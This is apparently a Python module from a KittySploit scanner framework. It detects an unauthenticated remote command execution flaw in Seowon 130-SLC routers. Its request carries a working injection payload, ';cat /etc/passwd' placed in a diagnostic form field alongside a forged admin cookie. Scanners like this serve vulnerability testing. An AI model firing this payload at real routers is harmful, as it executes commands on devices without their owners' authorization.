#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Seowon 130-SLC router lets remote attackers execute commands without authentication as admin users via the rou."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Seowon 130-SLC router - Remote Code Execution Detection',
        'description': 'Seowon 130-SLC router lets remote attackers execute commands without authentication as admin users via the router ip & Port(if available) in the request.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'unauth', 'iot', 'edb', 'rce', 'seowon', 'router', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/50295'],
    }

    def run(self):
        path = '/'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '{{BaseURL}}/diagnostic.html?t=201701020919', 'Cookie': 'product=cpe; cpe_buildTime=201701020919; vendor=mobinnet; connType=lte; cpe_multiPdnEnable=1; cpe_lang=en; cpe_voip=0; cpe_cwmpc=1; cpe_snmp=1; filesharing=0; cpe_switchEnable=0; cpe_IPv6Enable=0; cpe_foc=0; cpe_vpn=1; cpe_httpsEnable=0; cpe_internetMTUEnable=0; cpe_opmode=lte; sessionTime=1631653385102; cpe_login=admin'}, data='Command=Diagnostic&traceMode=trace&reportIpOnly=0&pingPktSize=56&pingTimeout=30&pingCount=4&ipAddr=&maxTTLCnt=30&queriesCnt=;cat /etc/passwd&reportIpOnlyCheckbox=on&btnApply=Apply&T=1631653402928\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Seowon 130-SLC router - Remote Code Execution detected', path=path)
            return True
        return False

